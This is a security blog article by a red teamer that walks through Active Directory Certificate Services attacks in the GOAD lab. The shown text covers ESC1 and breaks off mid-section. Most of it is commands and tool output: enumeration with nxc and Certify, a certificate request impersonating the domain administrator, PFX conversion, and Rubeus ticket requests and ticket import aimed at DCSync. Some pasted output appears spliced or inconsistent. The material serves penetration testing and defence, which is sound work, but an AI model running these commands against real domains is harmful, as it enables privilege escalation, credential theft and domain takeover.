<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><link rel="icon" href="/favicon.ico"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preconnect" href="https://fonts.googleapis.com"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"/><title>xbz0n@sh:~# <!-- -->Breaking ADCS: ESC1 to ESC16 Attack Techniques</title><meta name="description" content="Ivan Spiridonov (xbz0n) - Offensive security professional specializing in Red Teaming, Web/Mobile/AD Pentesting, and vulnerability research. Discover pentesting insights, exploit techniques, and security tools."/><meta property="og:type" content="article"/><meta property="og:url" content="https://xbz0n.sh/blog/adcs-complete-attack-reference"/><meta property="og:title" content="Breaking ADCS: ESC1 to ESC16 Attack Techniques"/><meta property="og:description" content="Let&#x27;s talk about Active Directory Certificate Services. If you&#x27;ve been doing red team work for any length of time, you&#x27;ve probably heard about ADCS attacks. ..."/><meta property="og:image" content="https://xbz0n.sh/images/adcs-attacks.png"/><meta property="og:image:width" content="1200"/><meta property="og:image:height" content="630"/><meta property="og:image:alt" content="Breaking ADCS: ESC1 to ESC16 Attack Techniques"/><meta property="twitter:card" content="summary_large_image"/><meta property="twitter:url" content="https://xbz0n.sh/blog/adcs-complete-attack-reference"/><meta property="twitter:title" content="Breaking ADCS: ESC1 to ESC16 Attack Techniques"/><meta property="twitter:description" content="Let&#x27;s talk about Active Directory Certificate Services. If you&#x27;ve been doing red team work for any length of time, you&#x27;ve probably heard about ADCS attacks. ..."/><meta property="twitter:image" content="https://xbz0n.sh/images/adcs-attacks.png"/><meta property="image" content="https://xbz0n.sh/images/adcs-attacks.png"/><meta property="author" content="Ivan Spiridonov"/><link rel="canonical" href="https://xbz0n.sh/blog/adcs-complete-attack-reference"/><meta name="next-head-count" content="24"/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin /><link rel="preload" href="/_next/static/css/d26a9e510d63e26e.css" as="style" crossorigin=""/><link rel="stylesheet" href="/_next/static/css/d26a9e510d63e26e.css" crossorigin="" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" crossorigin="" nomodule="" src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"></script><script src="/_next/static/chunks/webpack-fa99431b15635937.js" defer="" crossorigin=""></script><script src="/_next/static/chunks/framework-fae63b21a27d6472.js" defer="" crossorigin=""></script><script src="/_next/static/chunks/main-7f705b62e1c5c87e.js" defer="" crossorigin=""></script><script src="/_next/static/chunks/pages/_app-5894f79c417ecb15.js" defer="" crossorigin=""></script><script src="/_next/static/chunks/260-e9b07f57f9f93770.js" defer="" crossorigin=""></script><script src="/_next/static/chunks/pages/blog/%5Bslug%5D-1de5799e67e53b51.js" defer="" crossorigin=""></script><script src="/_next/static/2QMhEWvcHrpg0P0pdfI_k/_buildManifest.js" defer="" crossorigin=""></script><script src="/_next/static/2QMhEWvcHrpg0P0pdfI_k/_ssgManifest.js" defer="" crossorigin=""></script><style data-href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&display=swap">@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v23/tDbY2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKxjPg.woff) format('woff')}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v23/tDbY2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8-qxjPg.woff) format('woff')}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v23/tDbY2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8L6tjPg.woff) format('woff')}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v23/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx3cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v23/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxTcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v23/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxPcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v23/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx_cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v23/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx7cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v23/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwgknk-4.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v23/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx3cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v23/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxTcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v23/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxPcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v23/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx_cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v23/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx7cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v23/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwgknk-4.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v23/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx3cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v23/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxTcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v23/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxPcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v23/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx_cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v23/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx7cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v23/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwgknk-4.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}</style></head><body><div id="__next"><div class="flex flex-col min-h-screen"><nav class="bg-primary/80 backdrop-blur-sm sticky top-0 z-10 shadow-md"><div class="container py-4"><div class="flex items-center justify-between"><div class="flex items-center space-x-6"><a href="/"><span class="text-xl font-bold tracking-tighter bg-gradient-to-r from-accent to-blue-500 bg-clip-text text-transparent">xbz0n@sh:~#</span></a><div class="hidden md:flex space-x-6"><a class="nav-link" href="/">Home</a><a class="nav-link" href="/about">About</a><a class="nav-link" href="/blog">Blog</a><a class="nav-link" href="/tools">Tools</a><a class="nav-link" href="/cves">CVEs</a></div></div><div class="hidden md:flex items-center space-x-4"><a href="mailto:ivanspiridonov@gmail.com" class="text-gray-300 hover:text-accent" aria-label="Email"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" class="w-5 h-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M502.3 190.8c3.9-3.1 9.7-.2 9.7 4.7V400c0 26.5-21.5 48-48 48H48c-26.5 0-48-21.5-48-48V195.6c0-5 5.7-7.8 9.7-4.7 22.4 17.4 52.1 39.5 154.1 113.6 21.1 15.4 56.7 47.8 92.2 47.6 35.7.3 72-32.8 92.3-47.6 102-74.1 131.6-96.3 154-113.7zM256 320c23.2.4 56.6-29.2 73.4-41.4 132.7-96.3 142.8-104.7 173.4-128.7 5.8-4.5 9.2-11.5 9.2-18.9v-19c0-26.5-21.5-48-48-48H48C21.5 64 0 85.5 0 112v19c0 7.4 3.4 14.3 9.2 18.9 30.6 23.9 40.7 32.4 173.4 128.7 16.8 12.2 50.2 41.8 73.4 41.4z"></path></svg></a><a href="https://github.com/xbz0n" target="_blank" rel="noopener noreferrer" class="text-gray-300 hover:text-accent" aria-label="GitHub"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 496 512" class="w-5 h-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg></a><a href="https://twitter.com/xbz0n" target="_blank" rel="noopener noreferrer" class="text-gray-300 hover:text-accent" aria-label="Twitter"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" class="w-5 h-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"></path></svg></a><a href="https://www.linkedin.com/in/ivanspiridonov/" target="_blank" rel="noopener noreferrer" class="text-gray-300 hover:text-accent" aria-label="LinkedIn"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 448 512" class="w-5 h-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M100.28 448H7.4V148.9h92.88zM53.79 108.1C24.09 108.1 0 83.5 0 53.8a53.79 53.79 0 0 1 107.58 0c0 29.7-24.1 54.3-53.79 54.3zM447.9 448h-92.68V302.4c0-34.7-.7-79.2-48.29-79.2-48.29 0-55.69 37.7-55.69 76.7V448h-92.78V148.9h89.08v40.8h1.3c12.4-23.5 42.69-48.3 87.88-48.3 94 0 111.28 61.9 111.28 142.3V448z"></path></svg></a></div><button class="md:hidden focus:outline-none" aria-label="Toggle menu"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 448 512" class="h-6 w-6 text-gray-300" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M16 132h416c8.837 0 16-7.163 16-16V76c0-8.837-7.163-16-16-16H16C7.163 60 0 67.163 0 76v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16z"></path></svg></button></div></div></nav><main class="flex-grow container py-8"><article class="max-w-3xl mx-auto"><a class="text-accent hover:text-accent/80 mb-8 inline-block" href="/blog">← Back to all posts</a><div class="mb-8"><h1 class="text-3xl md:text-4xl font-bold mb-4">Breaking ADCS: ESC1 to ESC16 Attack Techniques</h1><div class="flex items-center text-sm text-gray-400"><time dateTime="2025-06-03">June 3, 2025</time></div></div><div class="blog-content">
<p><img src="/images/adcs-attacks.png" alt="ADCS attack vectors and certificate template abuse"></p>
<h2>Introduction</h2>
<p>Let's talk about Active Directory Certificate Services. If you've been doing red team work for any length of time, you've probably heard about ADCS attacks. What started as a convenient way to manage digital certificates has turned into one of the most powerful attack vectors in modern Windows environments.</p>
<p>Here's the problem - most organizations deploy ADCS with dangerous default configurations, and many admins don't understand the security implications of certificate templates. This creates a goldmine for attackers seeking privilege escalation and persistence that's incredibly hard to detect.</p>
<p>I've been exploiting ADCS misconfigurations for years, and what I've found is that the same features that make certificate services useful also make them dangerous. That flexible template system that admins love? It's perfect for privilege escalation. The auto-enrollment that makes management easy? It's a playground for persistence attacks. The single endpoint that handles everything? It bypasses traditional security controls.</p>
<p>In this article, I'll walk you through every major ADCS attack technique discovered to date - from the foundational ESC1-8 attacks to the latest ESC13-16 techniques. You'll learn not just how these attacks work, but how to implement them in real environments with practical code examples. Everything here is based on actual penetration tests I've conducted, with working examples you can adapt to your own assessments.</p>
<p><strong>Lab Environment</strong>: All examples in this article are demonstrated using the <a href="https://github.com/Orange-Cyberdefense/GOAD">GOAD (Game of Active Directory)</a> lab environment, which provides a realistic multi-domain Active Directory setup perfect for testing these techniques. The domains we'll be working with include <code>essos.local</code>, <code>sevenkingdoms.local</code>, and <code>north.sevenkingdoms.local</code>.</p>
<p>Whether you're a red teamer looking to expand your toolkit or a defender trying to understand these threats, this article will give you the deep technical knowledge you need.</p>
<h2>ADCS Fundamentals</h2>
<p>Before we start breaking things, let's understand what makes ADCS different from other Windows services you're used to attacking. ADCS implements a Public Key Infrastructure (PKI) that typically follows this hierarchy:</p>
<pre class="language-none"><code class="language-none">Root CA (Offline)
    └── Subordinate CA (Online)
        └── Certificate Templates
            └── Issued Certificates
</code></pre>
<p>Let's see what this looks like in our GOAD environment:</p>
<pre class="language-bash"><code class="language-bash"># Discover ADCS servers in the environment
nxc ldap 192.168.56.10-23 -u '' -p '' -M adcs

SMB         192.168.56.12   445    MEEREEN          [*] Windows 10.0 Build 17763 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:False)
LDAPS       192.168.56.12   636    MEEREEN          [+] essos.local\guest: 
ADCS        192.168.56.12   -      MEEREEN          Found PKI Enrollment Server: meereen.essos.local
ADCS        192.168.56.12   -      MEEREEN          Found CN=ESSOS-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local

SMB         192.168.56.23   445    BRAAVOS          [*] Windows 10.0 Build 17763 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:False)
LDAPS       192.168.56.23   636    BRAAVOS          [+] essos.local\guest: 
ADCS        192.168.56.23   -      BRAAVOS          Found PKI Enrollment Server: braavos.essos.local
ADCS        192.168.56.23   -      BRAAVOS          Found CN=ESSOS-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local
</code></pre>
<p>The key components we'll exploit:</p>
<ul>
<li><strong>Certificate Authority (CA)</strong>: Issues and manages certificates</li>
<li><strong>Certificate Templates</strong>: Define what certificates can be requested and by whom</li>
<li><strong>Certificate Store</strong>: Where certificates are stored on machines</li>
<li><strong>Auto-enrollment</strong>: Automatic certificate enrollment for domain objects</li>
</ul>
<h3>Certificate Template Basics</h3>
<p>Certificate templates are the core of ADCS attacks. They define:</p>
<ul>
<li>Who can request certificates (enrollment permissions)</li>
<li>What the certificate can be used for (Enhanced Key Usage)</li>
<li>Whether the subject name can be specified by the requester</li>
<li>Authentication requirements for enrollment</li>
</ul>
<p>Here's what makes templates dangerous - they often allow way more access than admins realize. Let's look at what we find in GOAD, and enumerate certificate templates with Certify: <code>Certify.exe find /vulnerable</code> command. This shows us several vulnerable templates in the GOAD environment. Now let's dive into exploiting them.</p>
<h2>ESC1: Misconfigured Certificate Templates</h2>
<p>ESC1 is the most straightforward ADCS attack, and honestly, it's my favorite because it's so reliable. It exploits certificate templates that allow attackers to specify arbitrary Subject Alternative Names (SANs).</p>
<h3>Technical Details</h3>
<p>The vulnerability happens when a certificate template has:</p>
<ol>
<li><strong>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</strong> flag enabled</li>
<li><strong>Client Authentication</strong> or <strong>Any Purpose</strong> EKU</li>
<li><strong>Domain Users</strong> enrollment permissions</li>
<li>No <strong>manager approval</strong> required</li>
</ol>
<p>When all these conditions align, you can request a certificate for any user in the domain. It's that simple.</p>
<h3>Exploitation Process</h3>
<p>First, let's enumerate vulnerable templates in our GOAD lab. Using Certify to find ESC1 vulnerabilities:</p>
<pre class="language-bash"><code class="language-bash">Certify.exe find /vulnerable /enabled /enrolleeSuppliesSubject

[*] Action: Find certificate templates
[*] Using current user's unrolled group SID list for cross-references
[*] Current user context       : ESSOS\missandei
[*] Using the search base 'CN=Configuration,DC=essos,DC=local'


[!] Vulnerable Certificates Templates :

    CA Name                       : braavos.essos.local\ESSOS-CA
    Template Name                 : ESC1
    Schema Version                : 2
    Validity Period               : 1 year
    Renewal Period                : 6 weeks
    msPKI-Certificate-Name-Flag   : ENROLLEE_SUPPLIES_SUBJECT (0x1)
    mspki-enrollment-flag         : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required: 0
    pkiextendedkeyusage           : Client Authentication
    Permissions
      Enrollment Permissions
        Enrollment Rights           : ESSOS\Domain Users                    Access: Allow
        Enrollment Rights           : ESSOS\Domain Computers                Access: Allow
      Object Control Permissions  : ESSOS\missandei                      Access: Allow

[*] CA Response             : The certificate has been issued.

  KeyType                  : rc4_hmac
  Base64(key)              : F5/CqQX4m7A8VwM5cT6pQg==

  Note: KeyType may show AES256 on fully-patched DCs (ADV240011)
  If KeyType shows AES256, ensure you use a 256-bit compatible CSP (e.g., Microsoft Software Key Storage Provider)
</code></pre>
<p>Perfect! This output confirms <code>ESSOS\Domain Users</code> (which <code>missandei</code> is a member of) have enrollment rights on the "ESC1" template, and the template allows an enrollee to supply the subject. <em>Note: The output also indicates <code>missandei</code> has "Object Control Permissions" over this specific template, which would additionally make it vulnerable to ESC4 by her. For ESC1, we primarily focus on the enrollment rights.</em></p>
<p>Perfect! Now let's request a certificate for the domain administrator. Request certificate impersonating Domain Admin:</p>
<p><strong>⚠️ Important:</strong> For accuracy and to avoid certificate mismatch issues, we should always aim to provide the <code>/sid</code> parameter which should be the SID of the user we are targeting (administrator in this case).</p>
<pre class="language-bash"><code class="language-bash">Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:ESC1 /altname:essos\administrator /sid:S-1-5-21-1394808576-3393508183-1134699666-500

[*] Action: Request a Certificates
[*] Current user context    : ESSOS\missandei
[*] No subject name specified, using current context as subject.

[*] Template                : ESC1
[*] Subject                 : CN=missandei, CN=Users, DC=essos, DC=local
[*] AltName                 : essos\administrator

[*] Certificate Authority   : braavos.essos.local\ESSOS-CA

[*] CA Response             : The certificate has been issued.
[*] Request ID              : 7

[*] cert.pem                :
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2hT8F6PSyEzGCq5VJXpF8rTQoYmZ9BNQ3T4Uy8F0aGF9ZLQW
...certificate data...
-----END CERTIFICATE-----

[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
</code></pre>
<p>Now let's convert to PFX format for use with Rubeus. There are two methods:</p>
<p><strong>Method 1: Using OpenSSL (cross-platform)</strong></p>
<pre class="language-bash"><code class="language-bash">openssl pkcs12 -in cert.pem -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out administrator.pfx
</code></pre>
<p><strong>Method 2: Using certutil (Windows native)</strong></p>
<pre class="language-bash"><code class="language-bash"># Save the private key and certificate to separate files
# cert.key (from -----BEGIN RSA PRIVATE KEY----- to -----END RSA PRIVATE KEY-----)
# cert.pem (from -----BEGIN CERTIFICATE----- to -----END CERTIFICATE-----)

# Then merge them with certutil
certutil -MergePFX .\cert.pem .\administrator.pfx
</code></pre>
<p>Use Rubeus to either request NTLM hash directly or get a Kerberos TGT:</p>
<pre class="language-bash"><code class="language-bash"># Get NTLM Hash directly
Rubeus.exe asktgt /user:administrator /certificate:administrator.pfx /getcredentials

# Or get TGT (traditional method)
Rubeus.exe asktgt /user:administrator /certificate:administrator.pfx /password:mimikatz

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=missandei, CN=Users, DC=essos, DC=local
[*] Building AS-REQ (w/ PKINIT preauth) for: 'essos.local\administrator'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFujCCBbagAwIBBaEDAgEWooIEwjCCBL5hggS6MIIEtqADAgEFoQ8bDUVTU09TLkxPQ0FM
      ...base64 encoded ticket...

[*] Action: Describe Ticket

  UserName                 : administrator
  UserRealm                : ESSOS.LOCAL
  ServiceName              : krbtgt/essos.local
  ServiceRealm             : ESSOS.LOCAL
  StartTime                : 1/3/2025 10:30:15 AM
  EndTime                  : 1/3/2025 8:30:15 PM
  RenewTill                : 1/10/2025 10:30:15 AM
  Flags                    : name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  : rc4_hmac
  Base64(key)              : F5/CqQX4m7A8VwM5cT6pQg==

  Note: KeyType may show AES256 on fully-patched DCs (ADV240011)
  If KeyType shows AES256, ensure you use a 256-bit compatible CSP (e.g., Microsoft Software Key Storage Provider)
</code></pre>
<p>Perfect! Now we can use the TGT to perform DCSync:</p>
<pre class="language-bash"><code class="language-bash">Rubeus.exe ptt /ticket:doIFujCCBbagAwIBBaEDAgEWooIEwjCCBL5hggS6...

[*] Action: Import Ticket
[+] Ticket successfully imported!

